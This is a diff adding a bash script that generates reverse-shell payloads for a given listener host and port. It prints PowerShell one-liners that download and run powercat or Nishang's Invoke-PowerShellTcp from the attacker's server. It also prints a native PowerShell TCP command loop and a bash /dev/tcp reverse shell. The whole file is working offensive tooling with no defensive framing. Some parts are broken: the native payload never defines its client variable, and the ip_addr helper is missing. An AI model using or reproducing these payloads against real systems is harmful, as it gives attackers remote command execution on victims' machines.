@@ -1,0 +1,83 @@
+#!/bin/bash
+
+set -e
+
+err() {
+  >&2 echo $@
+}
+
+debug() {
+  {
+    >&3 echo $@
+  } 3>&2
+}
+
+out() {
+  echo $@
+}
+
+usage() {
+  echo "$(basename $0) [type] -p LPORT [-l LHOST | -i INTERFACE]"
+  echo "TYPES:"
+  printf "\t ps - powershell\n"
+  printf "\t sh - shell"
+  exit 1
+}
+
+mode=$1; shift
+while getopts "hp:r:i:l:w:" o; do
+  case "${o}" in
+    p)
+      LPORT=${OPTARG}
+      ;;
+    l)
+      LHOST=${OPTARG}
+      ;;
+    i)
+      LHOST=$(ip_addr ${OPTARG})
+      ;;
+    w)
+      WWW_PORT=${OPTARG}
+      ;;
+    h | *)
+      usage
+      ;;
+  esac
+done
+shift $((OPTIND-1))
+
+if [ -z "${LPORT}" ] || [ -z "${LHOST}" ]; then
+  usage
+fi
+
+ps_powercat() {
+  BASE_URL="http://$LHOST:${WWW_PORT:-80}"
+  echo -n "IEX (New-Object System.Net.WebClient).DownloadString('${BASE_URL}/windows/powercat.ps1');powercat -c $LHOST -p $LPORT -e powershell.exe"
+}
+
+ps_nishang() {
+  BASE_URL="http://$LHOST:${WWW_PORT:-80}"
+  echo -n "IEX (New-Object System.Net.WebClient).DownloadString('${BASE_URL}/windows/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $LHOST -Port $LPORT"
+}
+
+ps_native() {
+  echo -n "New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+}
+
+generate_powershell() {
+  # ps_powercat
+  ps_nishang
+}
+
+generate_bash() {
+  echo -n "/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+}
+
+case "$mode" in
+  ps | powershell)
+    generate_powershell
+    ;;
+  sh | shell)
+    generate_bash
+    ;;
+esac
